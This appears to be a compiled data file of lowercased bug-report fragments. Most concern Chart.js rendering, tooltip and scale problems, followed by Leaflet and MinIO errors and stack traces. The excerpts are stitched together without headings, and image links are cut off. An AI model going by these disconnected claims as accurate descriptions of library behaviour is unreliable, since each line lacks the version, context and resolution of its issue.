it works with chart js 2.1.0.
the first and last bar in the bar chart are cut off
chart.options.scales.yaxes[0].ticks.fontcolor = '#ffffff' and follow by calling chart.update(), doesn't update barchart font color to white color.
the tick marks are rendering after the labels
if the browser window is narrowed the canvas fills the row but when you maximize the window it doesn't go back to how it was
steps get rounded up to : [0, 3, 5, 8, 10].
when switching browser tabs the chart will disappear, it will reappear whenever you mouse over an interactive part of the chart (popover for example).
when i describe my point this way (in the dataset): this display white circle with a small blue border
the legend, though, shows a completely blue circle
no white in the middle.
on my desktop and my dev colleague desktop, on chrome and firefox, the bar is correctly highlighted when i pass my cursor over the bar.
on two others desktop, with the same firefox version like us, when we have the cursor over a bar on the middle or the end of the chart, the bar is not highlighted
but, when we have the cursor out of the bar, the bar is hightlighted
in chrome, they have the bar correctly highlighted.
with the two same desktop, the bug may be reproduced on two of our three servers
we have the same code and the same environment on the three servers
i emptied their cache but they still have the bug.
chart and legend are colliding
resulting in some data points being hidden behind legend
![3h5qw](
on resize event the canvas will flicker and then the animation will follow.
chrome, firefox: ~17 sec animation
ie, ms edge: ~8 sec animation timings have the same relative values for any duration set.
that is kind of problematic for user expirience in different browsers.
they stopped working.
currently, the bars at the beginning and end of the datasets are being drawn off canvas.
data is drawn in incorrect order like this: [incorrect](
the pointlabels and tick labels collide.
in internet explorer, chartjs causes endless loop while generating a set of logarithmic ticks
then ends up with out of memory exception
the reason "significand" on ticks.
if the stacks are unsorted, the render chart is bugged and unusable
datasets are displayed on the wrong stack, layered one above the other.
the first string in the array is centered to the bar, and subsequent strings are stacked below the first one.
chart.js adds errors to the console as the css is refused by the csp rules
when i try to convert a multi-axis graph overlayed , from vertical to horizontal, it does not work.
it fails with the above error.
when nesting the chart in `<details>`, the chart does not display
this bug appears to happen only in firefox
in chrome and opera, the chart is displayed.
![logarithmic auto scale issue](
time scale should be distributed by assigned datetime
first cycle:
start @ 2017-11-02t20:30:00.000z,
max reached @ 2017-11-03t13:07:00.000z
stopped @ 2017-11-03t16:30:00.000z now have a look @ codepen.
start is ok
max reached at 13:07, seems to be ok
stopped at 16:30, but bar is at the end of day second cycle is started at 20:53 but bar is placed before previous cycle's end
2nd cycle's max is reached at 11-04 04:50 but placed in center of day
2nd cycle's end is at 11-04 11:50 but placed to beginning at 11-05 ...and so on
![image](
when creating a chart with a min & max time but no unit on either the x or y scale, no labels are being drawn
after looking through the code, it seems that the `determineunitforautoticks` is returning an unreasonably large unit "month" in my case rather than something reasonable for my use case such as day.
no animation occur when the page is loaded on chrome (after the loading of the page with the re-loading of every assets)
this occur only when responsive is true
#l721 `me.zerolineindex` results in undefined for the vertical `gridlines`
breakpoint after causing a re-render.
![undefined me zerolineindex]( this behavior appears to have been introduced in 2.7.0
reverting back to 2.6.0 fixes this particular issue (but introduces others) at least in the browser
in the codepen below changing to 2.6.0 doesn't seem to fix it.
the tooltip moves/shakes unexpectedly/unpredictably when moving mouse pointer between bars ![2017-11-23-tooltipbug](
a linear chart is continuously updated every couple of seconds by assigning to it's datasets and labels property before calling the update method using the following code: ```
const chartdata = chart.data as linearchartdata;
chartdata.datasets = newdata;
chartdata.labels = labels;
chart.update(0);
``` after some hours of normal behavior an exception occurs in production: ```
typeerror: cannot read property '_meta' of undefined at t.getdatasetmeta ( at t.updatehoverstyle ( at t.handleevent ( at t.eventhandler ( at n ( at htmlcanvaselement.s.(anonymous function) ( at e.invoketask ( at object.oninvoketask ( at e.invoketask ( at r.runtask ( ``` the stack trace points toward a bug inside chart.js.
in page (data structure section), the link to **time scale** is broken: ![image](
stays linear
you see i have only a couple of timestamps and it creates a bar with information that is not true.
i want only bar at the correct timestamp, not spreading weird:s the bar chart currently
![barchart](
the bar chart data
![barchart data](
when a chart contains a title chart is cut
the example with chartjs version 2.7.1: ![image](
the data point for 2017-01-17 18:00:00 is charted next to the tick for 2017-01-19
disabling displaycolors and removing the title leads to black font in body.
when i use a custom google font 'hind' - the labels on the radar chart get cut off on the bottom
see screenshot attached
this happens with this font no matter what font size i set it at
**update - in firefox it cuts off the top - added another screenshot** this happens with "responsive: true" and "responsive:false"
if autoskip is set to false, null ticks are graphed alongside non-null ticks.
![screenshot-jsfiddle net 2017-09-25 16-14-35-384](
once updating to v2.7, the top of the chart gets cut off: <img width="576" alt="v2_7" src=" ">
user trigger refresh and then click on other link in the meantime the chart is rendering, we get this exception: ns_error_failure: chart.js:7886 draw/< [26]</module.exports/helpers.each http:/..../chart.js:5052:6 draw draw/< [26]</module.exports/helpers.each draw render [26]</module.exports/helpers.callback advance startdigest requestanimationframe/me.request< http:/..../chart.js:3483:6
seems the bottom title is "mav" not #"may"
tried on safari and google chrome
same result
this is a screenshot:
<img width="281" alt="screen shot 2017-09-14 at 2 50 21 pm" src=" "> on firefox it is fine but on my own project the top label is being chopped off.
i set max value in time scale it working fine when dataset has 2 and more values otherwise behaviour unexpected
why it is behaving like this.
every increment of 1ex, 2ex, and 5ex are shown between the min and max
this can be exceptionally hard to read
the codepen linked below shows the issue, but using my actual data which has a much larger range the axis looks even worse.
![image](
i've built a multiple lines chart, the snapshot looks like
![clip]( actually all points near to edge got same issue
![clip2]( i've tried to adjust padding between y axis and chart area, not work
the only solution could be adding two extra data to beginning and end of the line, but it's not that straightforward, any better idea?
the line is bumpy.
creating a new bubble chart with one single point(as in the example provided) the browser becomes unresponsive (safari) or returns an error (chrome)
when data lies outside the range, in time scale, only one data point is hidden
the second data point stays visible, and fixes the limit of the axis scale
this happens at both sides of the scale
ticks are still decided based on the actual range between min and max, which causes warps and weird-looking charts.
area between two lines is not filled correctly when the `steppedline` value is set to `'before'` or `'after'`.
it returns the value of the bar dataset.
currently, a stacked bar chart (and maybe others) will not render if options.labels is omitted or if options.labels is set to an empty array
if labels is even given a single, empty element, all datasets then render.
note that this seems to be a regressive bug
the same chart definition renders in 2.1.x.
when passing an array of color, [chart's background]( becomes grey.
zooming causes data set labeling to be shown outside of the chart x-axis
note that i did not try to test it with y-axis!!
see <img width="614" alt="screen shot 2017-08-16 at 20 26 00" src=" "> with missing 3rd bar, bars 2 and 4 become too large and are no longer centered around their x position.
bars are drawn when timestamps are in number format, but not in string format
if a data point has a wrong time format, a time scale starts from jan 1, 1970.
when the canvas container has `style="display: none;"` then later on set to `block` using js, used with the chart option `maintainaspectratio: false`, the height of the chart is squished to around `20px` or in some cases `0px`.
if you put a null into the data list for a bubble chart, the code will blow up in getradius while trying to access the 'r' field of that data point.
(sometimes)
![bad](
the chart renders correctly with the exception with the data lines which are missing.
the chart y-axis labels are cut off.
the chart cannot display and error message in my console:
here is the message log:
typeerror: t is null
r@
addeventlistener@
bindevents@
initialize@
construct@
some data points disappeared
in this case, `{ x: 0.06, y: 0.48614314
{ x: 0.06, y: 0.6085987
}` disappeared.
<img width="498" alt="default" src=" ">
currently, the graph starts at 6:00:01.050 pm, and ends at 6:00:01.950pm
notice the dark tick marks at the requested min/max values
also, the background fill extends outside the graph area.
grids do not fit perfectly in the pane, and end up being squashed at the end of the grid, which results in overlapping x-axis text
the x-axis is also not starting at 0.
<iframe class="chartjs-hidden-iframe" tabindex="-1" style="display: block; overflow: hidden; border: 0px; margin: 0px; top: 0px; left: 0px; bottom: 0px; right: 0px; height: 100%; width: 100%; position: absolute; pointer-events: none; z-index: -1;">
when it doesn't : ![image](
as you can see, last points aren't displayed at the end
someone can tell me how to fix this ? is there any specific option ? ## config options
i\'m using moment this way : xaxes: [{ type: "time", time: { format: \'mm/dd/yyyy hh:mm\', tooltipformat: \'ll hh:mm\' }, scalelabel: { display: true, labelstring: \'date\' }
the bars superimpose on the chart, making in unreadable
chart breaks page
currently, fill area is drawn outside the chart area if the axis has `ticks.min`, `ticks.max` or `elements.line.capbezierpoints` set to false, and a data point exists outside the scale.
shows only the fractional part
first off all chart.js calculation l1 width (in my case used longesttext for all tick), but after that chart.js add several ticks
[0, 1, 2, 3] => [0, 0.5, 1, 1.5, 2, 2.5, 3]
the following error occurs at (1) of the code above
[error] typeerror: undefined is not an object (evaluating \'dataset._meta\') getdatasetmeta (chart.js:4331) ondatashift (chart.js:4886) (anonymous function) (chart.js:4617) each (chart.js:5052) value (chart.js:4615) onload (show:65)"
after filtering out the modals based on their name, the pie chart appears like so:
![broken](
![broken2]( the pie chart will flicker between the half-pie and the small pie depending on which one has had a mouseover event most recently.
- **issue#a** : tooltip is jumping (not smooth)
- **issue#b** : tooltip does not disappeared when touch end.
the line chart xaxis displays dates with a difference of 2 minutes
crashes the browser
sometimes (i am not able to isolate the conditions to re-create this), one of the series is hidden by another one
you can see on this example that the `item rev-rec` series seems to have disappeared
if you hide the `item cash-flow` series, the `item-rev-rec` series appears
i am also attaching an example where this works as expected
some of the labels disappear, even if autoskip is false.
scatter plot example appears to be trying to connect the dots:
![screenshot_20170614_102055](
when i update de data of the chart and call `chart.update()` the chart animates to the updated state, but the tooltip remains in the same position
if i move the mouse while the animation of the chart is taking place, then the tooltip does the movement that you would expect, following the data on the chart
if, after the animation took place i move the mouse, then the tooltip goes to the position where it should have been animated.
chrome throws warning
`[violation] added non-passive event listener to a scroll-blocking 'touchstart' event
consider marking event handler as 'passive' to make the page more responsive.` on l#5755
an error is thrown:
uncaught typeerror: cannot read property '_view' of undefined at chart.js:10044 at dofill (chart.js:10242) at object.beforedatasetdraw (chart.js:10325) at object.notify (chart.js:6937) at chart.drawdataset (chart.js:4292) at chart.drawdatasets (chart.js:4271) at chart.draw (chart.js:4233) at chart.render (chart.js:4191) at object.helpers.callback (chart.js:5996) at object.advance (chart.js:3528)
[error] typeerror: minmoment.round is not a function
(in 'minmoment.round(timeopts.round)', 'minmoment.round' is undefined) buildticks (chart.bundle.js:17082) update (chart.bundle.js:11794) getminimumboxsize (chart.bundle.js:11062) each (chart.bundle.js:9515) update (chart.bundle.js:11076) updatelayout (chart.bundle.js:8577) update (chart.bundle.js:8543) construct (chart.bundle.js:8307) chart (chart.bundle.js:10803) onload (show:74)
the hover animation has the same duration has the initial loading animation.
specifying a new default color has no effect
the initial one persists.
nothing happens on hover, but the onclick event is working.
<img width="324" alt="screen shot 2017-05-26 at 13 48 18" src=" ">
touchstart and touchend event listeners log verbose level [violation] messages (see below).
currently the tooltip fails to properly show and sort of soft-locks in place and the following error is presented in the console: uncaught error: unable to parse color from object {"shapetype":"dash"}
the end of march appears to show the last 3 days aligned vertically
it looks like it's trying to fit 31 days into 28 (as though its aligned with february)
this does not happen in if time unit is week or day.
chat will not show max and parts are not separated by equal steps
see it happening here
raise : uncaught domexception: failed to execute 'arc' on 'canvasrenderingcontext2d': the radius provided (-5) is negative.
i have this error with google chrome, not firefox
have 3 y axes - one is stacked, another are unstacked.
have 3 bar series - each one places in different axis.
one series overlaps other one
seems line chart displays a 1 px line on the top and bottom in chart.js 2.5
> uncaught typeerror: cannot set property 'options' of undefined
**callback** parameter is called three time
no lines or points are rendered
![image](
i have a set of labels showing time going from 6am to 6pm, but the graph show an extra 7pm
apparently since v2.4.0, if two points are close to each other and the user hovers near that intersection, the point that is in a hover state might not align with the tooltip being shown
note that this appears to only occur when we have a high `pointhitradius` and have `pointbackgroundcolor: 'transparent'`
<img src=" " alt="2017-04-06_11-44-59" width="300"> note that in this case, the hover background color is still transparent, making the tooltip also have mis-aligned colors.
if you add padding to the chart, and start to resize the window, the legend items will shift and sometimes the last legend item will disappear
![shrink pie chart](
padding applies (partially?) to all sides of the pie chart
which puts unintended space between the chart and the legend.
chart is rendering in firefox not in other browsers.
i am looking for chrome and ie11 fix.
i have vertical bar with mix line chart, when it changes the type to horizontal bar the other dataset desapear
in mozilla firefox, that function produces "typeerror: canvas is undefined" error, so it cannot return the element at event, if a debounce function is used
without debounce function, it works in firefox
the debounce function i used was from lodash
tried with another implementations of debounce with no luck.
the chart disappears
there is a tiny dot in the top left corner
i'm guessing this is my squished chart(?) the graph container has the correct dimensions, the iframe has the correct dimensions, as does the canvas
which leads me to believe it is happening in the draw function
i'm not entirely sure when the chart is drawn
maybe the draw happens before the iframe is ready?
edit* ![screen shot 2017-03-29 at 2 25 58 pm](
ah! i found this
where would it be getting those numbers? it would be nice to see an error for nan inputs.
**final edit*** i had set borderwidth to "5px" and everything exploded silently.
- point radius is correct until mouse is moved over it - proper radius is not restored afterwards.
- tooltip is not shown when moving the mouse within "pointhitradius", only within the smaller radius.
after chartjs `2.4.0`, when setting `linearc` to `true` the chart is not diplayed.
whole value of bar is added to yaxis.ticks.min so that resulting bar has value = bardatavalue + yaxis.ticks.min.
the bubbles are displayed in the wrong position and also off-canvas:
<img width="453" alt="screen shot 2017-03-22 at 18 07 27" src=" ">
![multiline-label](
hello, we are developing kibana plugins
kibana 5.2.1 include node.js 6.9.5 angularjs 1.4.7 we plan to use chart.js as library on kibana
however, an error occurs when starting up node.js and startup is not completed
description of load processing(chart.js) part
> var chartjs = private(require(\'plugins/circle-vis/chartjs/chart\')); error message from kibana > mar 15 20:49:53 localhost kibana: {"type":"log","timestamp":"2017-03-15t11:49:53z","tags":["info","optimize"],"pid":3875,"message":"optimizing and caching bundles for kibana, timelion and status_page
this may take a few minutes"}
> mar 15 20:50:58 localhost kibana: {"type":"log","@timestamp":"2017-03-15t11:50:58z","tags":["fatal"],"pid":3875,"level":"fatal","message":"optimizations failure.\ \ error in /usr/share/kibana/plugins/circle-vis/public/chartjs/chart.js\ module build failed: typeerror: /usr/share/kibana/plugins/circle-vis/public/chartjs/chart.js: name.tolowercase is not a function\ at check (/usr/share/kibana/node_modules/babel-core/lib/transformation/transformers/validation/react.js:20:22)\ at nodepath.callexpression (/usr/share/kibana/node_modules/babel-core/lib/transformation/transformers/validation/react.js:40:7)\ at nodepath.call (/usr/share/kibana/node_modules/babel-core/lib/traversal/path/context.js:56:28)\ at nodepath.visit (/usr/share/kibana/node_modules/babel-core/lib/traversal/path/context.js:90:8)\ at traversalcontext.visitsingle (/usr/share/kibana/node_modules/babel-core/lib/traversal/context.js:132:12)\ at traversalcontext.visit (/usr/share/kibana/node_modules/babel-core/lib/traversal/context.js:148:19)\ at function.traverse.node (/usr/share/kibana/node_modules/babel-core/lib/traversal/index.js:76:17)\ at nodepath.visit (/usr/share/kibana/node_modules/babel-core/lib/traversal/path/context.js:107:26)\ at traversalcontext.visitmultiple (/usr/share/kibana/node_modules/babel-core/lib/traversal/context.js:108:16)\ at traversalcontext.visit (/usr/share/kibana/node_modules/babel-core/lib/traversal/context.js:146:19)\ at function.traverse.node (/usr/share/kibana/node_modules/babel-core/lib/traversal/index.js:76:17)\ at nodepath.visit (/usr/share/kibana/node_modules/babel-core/lib/traversal/path/context.js:107:26)\ at traversalcontext.visitmultiple (/usr/share/kibana/node_modules/babel-core/lib/traversal/context.js:108:16)\ at traversalcontext.visit (/usr/share/kibana/node_modules/babel-core/lib/traversal/context.js:146:19)\ at function.traverse.node (/usr/share/kibana/node_modules/babel-core/lib/traversal/index.js:76:17)\ at
> mar 15 20:50:58 localhost kibana: nodepath.visit (/usr/share/kibana/node_modules/babel-core/lib/traversal/path/context.js:107:26)\ /usr/share/kibana/plugins/circle-vis/public/circle_vis_controller.js 13:26-69\ ","error":{"message":"optimizations failure.\ \ \\u001b[1m\\u001b[31merror in /usr/share/kibana/plugins/circle-vis/public/chartjs/chart.js\ module build failed: typeerror: /usr/share/kibana/plugins/circle-vis/public/chartjs/chart.js: name.tolowercase is not a function\ at check (/usr/share/kibana/node_modules/babel-core/lib/transformation/transformers/validation/react.js:20:22)\ at nodepath.callexpression (/usr/share/kibana/node_modules/babel-core/lib/transformation/transformers/validation/react.js:40:7)\ at nodepath.call (/usr/share/kibana/node_modules/babel-core/lib/traversal/path/context.js:56:28)\ at nodepath.visit (/usr/share/kibana/node_modules/babel-core/lib/traversal/path/context.js:90:8)\ at traversalcontext.visitsingle (/usr/share/kibana/node_modules/babel-core/lib/traversal/context.js:132:12)\ at traversalcontext.visit (/usr/share/kibana/node_modules/babel-core/lib/traversal/context.js:148:19)\ at function.traverse.node (/usr/share/kibana/node_modules/babel-core/lib/traversal/index.js:76:17)\ at nodepath.visit (/usr/share/kibana/node_modules/babel-core/lib/traversal/path/context.js:107:26)\ at traversalcontext.visitmultiple (/usr/share/kibana/node_modules/babel-core/lib/traversal/context.js:108:16)\ at traversalcontext.visit (/usr/share/kibana/node_modules/babel-core/lib/traversal/context.js:146:19)\ at function.traverse.node (/usr/share/kibana/node_modules/babel-core/lib/traversal/index.js:76:17)\ at nodepath.visit (/usr/share/kibana/node_modules/babel-core/lib/traversal/path/context.js:107:26)\ at traversalcontext.visitmultiple (/usr/share/kibana/node_modules/babel-core/lib/traversal/context.js:108:16)\ at traversalcontext.visit (/usr/share/kibana/node_modules/babel-core/lib/traversal/context.js:146:19)\ it seems that the specified file can be read, but it gets an error.
there is no change in the situation even if you downgrade chart.js could you give me some advice?
when responsive is set to true, chart only resizes when container size increases and does not resize when it decreases
letter spacing does not work and sometimes letters "stick" to each other
`stacked` does not appear to have an effect in the `xaxes` property.
attempting to create the chart will effectively freeze the browser.
the scales are not displaying correctly
i know this is an issue with log(0) being undefined but i thought the fix [#3016]( solved this problem.
for some reason, the first tick is being displayed below 0 on the y scales
this only happens when a value is 0
![image]( if the first scale tick could be displayed in the correct place above the 0 tick then the chart would be perfect for my use.
bar is overlapping the y ticks.
the passed parameter is undefined.
when returning an array from `labelcolor` on tooltips callbacks, all squares appear black.
please refer to #3583 for jsfiddle (basically the built-in autoskip not working here)
label is moving left/right on horizontal axis and not at all on a vertical axis.
only the last dataset's background color is shown
![image]( the black markers above point to the different colors for the datasets yet only the last one(shown at the top) is being shown.
current behaviour is the **tooltip title label** font-size stays the same
it returns 34, e.g
only the fractional part
this is due to an error in the regexp.
![image](
see the screenshot
a small portion of the bar is displayed below the x-axis.
when using a line chart with xaxes time scale, the line is extending past the x origin
the chart squashes down until the chart area is too thin to be useful.
an exception is thrown: > uncaught typeerror: cannot set property '_chartjs' of null
after installing with npm and adding `var chart = require('src/chart.js');` in my script, i get the following error: > module not found: error: can't resolve 'src/chart.js' in '/path/to/my/project/resources/assets/js/components'
if the duration on the animation (for update) or the responsiveanimationduration (for resize) is set at 0 then the animation callback doesn't get the object and instead is called via a .call(this) which sets the `this` context for the callback function to be the chart instance.
this is what currently happens:
the final time axis label overlaps with the one before it
(seems to happen at most screen sizes.)
the bar widths appear to be random
![screen shot 2017-01-10 at 10 08 09 am](
horizontalbar: stacked axis(both), displays nan when all legends are unselected
please unselect all three legends in the below jsfiddle, a nan (actually half of the text) is displayed in left hand top corner near the legends)
the labels are cut off so only half the label is visible
there are many error message in the console when i hover the chart: cannot read property 'skip' of undefined
.update() will update the graph color (which is defined within data) but not ticks or labels (which are in the options dataset)
only reloading the whole site and building the chart from scratch it uses the new values.
as you can see in the screenshot, the graph and fill have been updated to blue, but the temperature label on the left yaxis is still orange (the original value)
![localhost-8100- 2](
the xaxis scale seems to increase too much, and data is lost in both the week and month (more than week) charts.
clumping the bars together as a week or month metric seems to be the root of the problem.
the value in the tooltip is preceded by a colon.
multiple y scales uses same ylabels
height set in css is ignored and canvas height is computed using config.aspectratio instead, per [this conditional]( #l73).
exception thrown
if a dataset has a long xaxis label, but the chart is small and that label not rendered the chart has extra padding on the bottom to accommodate that label
results in potentially a large amount of white space under the chart.
in some cases, my data does not fill the xaxis range.
show n/a item in tooltip.
currently, it displays data label two indexes down
when `min` is set to `'march'`, it displays `'may'`.
tooltip only displaying the first dataset ![chart1](
replacing the entire `data `object in a chart and calling `update()` on the chart, does not update the chart correctly.
`linetension` option doesn't work for radar chart type.
`tension` work
![radar chart linetention not work]( setting of this chart is `linetension` = 0.5
with `min` (or `max`) option, category size probably calculated from the total number of labels, not the number of labels displayed.
then, the size of bar will be smaller and shift ,even though `categorypercentage` and `barpercentage` is 1.
(also issues #3506 plugin added) ![report-chartjs-wrongcategorysize](
with axis stacked, the first dataset is not plotted
![untitled](
[chart.js v2.3.0]( ## animation
![issue](
with `responsive` set to `false`, the canvas is created as:
<canvas width="1280" height="960" style="display: block;"></canvas>
``` with `responsive` set to `true`, the canvas is created as:
<canvas width="2560" height="1920" style="display: block; width: 1280px; height: 960px;"></canvas>
an error is thrown
typeerror: cannot read property 'currentstyle' of null
chart throws error during destruction.
yaxes tick intervals remain at 0.5
![ticks](
if the scale is fixed, e.g: ```js
yaxes: [{ticks: { min: 0, max: 25
data points that fall outside of this range cause a line to be drawn outside of the chart ([interactive example](
this obstructs axes labels and the chart title
![screen shot 2016-11-01 at 10 19 03]( i have also tried this without the angular wrapper and the same behaviour occurs.
it shows 1st january 1970
see:
<img width="510" alt="screen shot 2016-10-28 at 1 58 34 pm" src=" ">
autoskippadding is not included in the documentation, but it is in the tests and in source where it is used in calculating where ticks should be drawn on the canvas.
the last tick is shown and should not because of the `unitstepsize` (same issue with the grid)
nothing happens
in version 1.6 the expected behaviour is observed
in version 1.7.1 chrome exhibits the expected behaviour, but safari doesn't
the differences between the two events are included below
mouseevent 1:
mouseevent _simulated: true
composed: false
istrusted: false
offsetx: 15
offsety: 28
screenx: 1390
screeny: 189
timestamp: 499337
webkitforce: 0
``` mouseevent 2:
mouseevent composed: true
istrusted: true
offsetx: 15
offsety: 20
screenx: 1390
screeny: 189
timestamp: 538265
webkitforce: 1
``` `_simulated`, `composed`, `istrusted` and perhaps `webkitforce` seem to be the key differences, but it also seems odd that there are different timestamps and y dimensions between the two events.
when quickly zooming using mouse wheel or a pad, the image sometime go away and refit causing a bad user experience
a crash occurs cause it assumes a certain member function is present
marker.drag.js:111 uncaught typeerror: this._marker.closepopup is not a function at newclass._ondragstart (marker.drag.js:111) at newclass.fire (events.js:190) at newclass._onmove (draggable.js:157) at htmldocument.handler (domevent.js:79)
the click handler isn triggered when using safari (or chrome) on ios.
svg element class attribute is only `class="leaflet-image-layer leaflet-zoom-animated"`
tiles are selected, and they appear in a blue color, like this:
![image](
for the diagonal lines it works well
horizontal and vertical lines lose their mouseover status as soon as the mouse goes out of the original (thinner) line.
quickedit: i just found out that the problem arises as well when going over the ends of the lines
this happens on all the lines.
no alert is displayed, and the pointer shape does not change as it usually does with mouse over.
when using a tilelayer with minzoom set and the map zoomed out beyond the value of minzoom, removing the map causes an error <img width="488" alt="screen shot 2019-01-22 at 9 41 46 pm" src=" ">
tilelayer redraw partly: ![image](
![image]( on the console
```cross-origin read blocking (corb) blocked cross-origin response with mime type text/html
see for more details.``` on network tools
```307 temporary redirect content-security-policy: block-all-mixed-content location: ...6d8ac2323de6ac810352c721603e6020.jpg vary: origin x-amz-request-id: 163d96f14ea12078 x-xss-protection: 1; mode=block content-length: 0```
when anonymous policy is 'download' bucket folder chmod changes to read
if authenticated user tries to upload file it crashes internally "we encountered an internal error, please try again.", because "error: rename .../.minio.sys/tmp/..
.../bucket/..
permission denied"
i use four me
the overwriting actions are performed successfully, and there are multiple version objects in the bucket.
the delete call `api: deletemultipleobjects(bucket=xxx)` throws an error:
api: deletemultipleobjects(bucket=dro)
time: 13:07:23 utc 09/02/2020
deploymentid: d23bfe1b-f3d6-4421-892b-a7902e3c4643
requestid: 1630f950e5394e84
remotehost: 172.17.0.1
host: 127.0.0.1:9000
useragent: hadoop 3.1.0, aws-sdk-java/1.11.754 mac_os_x/10.13.6 openjdk_64-bit_server_vm/25.242-b08 java/1.8.0_242 scala/2.11.12 groovy/2.4.11 vendor/adoptopenjdk
error: -> github.com/azure/azure-storage-blob-go/azblob.newstorageerror, github.com/azure/azure-storage-blob-go@v0.8.0/azblob/zc_storage_error.go:42
===== response error (servicecode=internalerror) =====
description=server encountered an internal error
please try again after some time.
requestid:52d8dd8d-001e-0099-0229-819ac5000000
time:2020-09-02t13:07:23.8550678z, details: code: internalerror delete authorization: redacted user-agent: [apn/1.0 minio/1.0 minio/2020-08-27t05:16:20z] x-ms-client-request-id: [fa2a6276-c33e-48b2-6ec7-06a271781885] x-ms-date: [wed, 02 sep 2020 13:07:23 gmt] x-ms-version: [2018-11-09] -------------------------------------------------------------------------------- response status: 500 server encountered an internal error
please try again after some time
content-length: [253] content-type: [application/xml] date: [wed, 02 sep 2020 13:07:23 gmt] server: [windows-azure-blob/1.0 microsoft-httpapi/2.0] x-ms-error-code: [internalerror] x-ms-request-id: [52d8dd8d-001e-0099-0229-819ac5000000] x-ms-version: [2018-11-09] 4: cmd/api-errors.go:1961:cmd.toapierrorcode() 3: cmd/api-errors.go:1986:cmd.toapierror() 2: cmd/bucket-handlers.go:458:cmd.objectapihandlers.deletemultipleobjectshandler() 1: net/http/server.go:2041:http.handlerfunc.servehttp()
we receive a lot of (uncatched) 'interrupted system calls' whenever minio tries to do file operations like reading the format.json etc
(during initialization etc.)
messags like:
error unable to initialize backend: open /data/.minio.sys/format.json: interrupted system call
the gui for docker on synology nas shows environmental variables for minio_access_key_file and minio_secret_key_file.
i am getting 400 bad request error from minio server while uploading video of size larger than 1 mb
also getting error - body of your post request is not well formed error log on ios side
error domain=com.alamofire.error.serialization.response code=-1011 "request failed: bad request (400)" userinfo={nslocalizeddescription=request failed: bad request (400), nserrorfailingurlkey=** name/**, com.alamofire.serialization.response.error.data={length = 341, bytes = 6c207665 7273696f 6e3d2231 ..
3c2f4572 726f723e }, com.alamofire.serialization.response.error.response=<nshttpurlresponse: > { url: ** name/**, } { status code: 400, headers { "accept-ranges" = ( bytes ); connection = ( close ); "content-security-policy" = ( "block-all-mixed-content" ); "content-type" = ( "application/xml" ); date = ( "wed, 26 aug 2020 08:26:16 gmt" ); server = ( "minio/release.2019-03-27t22-35-21z" ); "transfer-encoding" = ( identity ); vary = ( origin ); "x-amz-request-id" = ( 162ec3f1ba60cc93 ); "x-minio-deployment-id" = ( "90b44fa3-ada0-41e3-923d-1ff68e459265" ); "x-xss-protection" = ( "1; mode=block" );
[tim@lddata-live-jupyter01 tim_minio_speed_test]$ time mc cp --recursive blue/top-of-book/parquet/datasource_label\\=ldprof/year\\=2020/month\\=04/ test_blue
...-top-of-book-2020-04-30-23-59.parquet: 31.79 gib / 31.79 gib 100.00% 91.04 mib/s 5m57s
real 28m51.871s
user 9m36.892s
sys 9m44.080s
[tim@lddata-live-jupyter01 tim_minio_speed_test]$ du -sh test_blue/
32g test_blue/
[tim@lddata-live-jupyter01 tim_minio_speed_test]$ time mc cp --recursive blue/top-of-book/parquet/datasource_label\\=ldprof/year\\=2020/month\\=04/ test_blue
...-top-of-book-2020-04-30-23-59.parquet: 31.79 gib / 31.79 gib 100.00% 92.26 mib/s 5m52s
real 6m6.236s
user 7m58.164s
sys 6m34.238s
sending a blank token makes it work as expected.
fails to build with: ```
# github.com/shirou/gopsutil/host
vendor/github.com/shirou/gopsutil/host/host_darwin_cgo.go:9:11: fatal error: \'include/smc.c\' file not found #include "include/smc.c" ^~~~~~~~~~~~~~~
1 error generated.
i get the following error:
java.nio.file.accessdeniedexception: s3a://sparkdata/bureau_balance.csv: getfilestatus on s3a://sparkdata/bureau_balance.csv: com.amazonaws.services.s3.model.amazons3exception: forbidden (service: amazon s3; status code: 403; error code: 403 forbidden; request id: 570435dc55fc9b3b; s3 extended request id: 4us9wcbdlcmfyaiawohyj79lhthycs3ucjb/dh3o51kewyrw+1kxogubvvm7bv2hjkfqvxx2jds=; proxy: null), s3 extended request id: 4us9wcbdlcmfyaiawohyj79lhthycs3ucjb/dh3o51kewyrw+1kxogubvvm7bv2hjkfqvxx2jds=:403 forbidden
api: system()
time: 09:30:46 cst 07/14/2020
error: as has incorrect configuration: remote server offline 1: github.com/minio/minio@/cmd/server-main.go:489:cmd.servermain()
in continuation with #9976 the server configuration with openid works sometimes in windows and sometimes it gives un trusted certificate
but when the server connects on windows or linux, ui login with openid is working but post request mentioned in which is
gives below error, ```
<?xml version="1.0" encoding="utf-8"?>
<errorresponse xmlns=" "> <error> <type></type> <code>invalidparametervalue</code> <message>crypto/rsa: verification error</message> </error> <requestid>161fb922bcc96904</requestid>
</errorresponse>
**with accesskey and secretkey** ![image](
trying to implement minio + sts from issue,
certificate is copied to \\.minio\\certs\\cas
starting the server as,
set minio_access_key=minioadmin
set minio_secret_key=minioadmin
set minio_identity_openid_config_url=
set minio_identity_openid_client_id=843351d4-1080-11ea-aa20-271ecba3924a
minio server e:\\filepath but most of times server fails to connect to openid saying,
error: unable to initialize openid: get x509: certificate signed by unknown authority
i get this message (as xml):
`the request signature we calculated does not match the signature you provided
check your key and signing method.
minio throws an error related to go 1.14 update, as there are some unnecessary parentheses in a check
# helm upgrade --install $(for i in $(cat configuration.txt); do echo -e "-f $i"; done) gitpod .
release "gitpod" does not exist
installing it now.
error: template: gitpod-selfhosted/charts/gitpod/charts/minio/templates/deployment.yaml:192:20: executing "gitpod-selfhosted/charts/gitpod/charts/minio/templates/deployment.yaml" at <(not .values.gcsgateway.enabled) (not .values.azuregateway.enabled) (not .values.s3gateway.enabled) (not .values.b2gateway.enabled)>: can\'t give argument to non-function not .values.gcsgateway.enabled
i get a wall of errors, as well as the "waiting for a minimum of 2 disks to come online (elapsed 1s)" <pre><code>api: system()
time: 01:26:01 utc 06/15/2020
error: http: panic serving 192.168.88.1:58708: runtime error: invalid memory address or nil pointer dereference 1: github.com/minio/minio@/cmd/server-main.go:453:cmd.servermain.func2() api: system()
time: 01:26:01 utc 06/15/2020
error: goroutine 299 [running]: 1: github.com/minio/minio@/cmd/server-main.go:453:cmd.servermain.func2() api: system()
time: 01:26:01 utc 06/15/2020
error: net/http.(*conn).serve.func1( ) 1: github.com/minio/minio@/cmd/server-main.go:453:cmd.servermain.func2() api: system()
time: 01:26:01 utc 06/15/2020
error: net/http/server.go:1767 + 1: github.com/minio/minio@/cmd/server-main.go:453:cmd.servermain.func2() ..
api: system()
time: 01:26:01 utc 06/15/2020
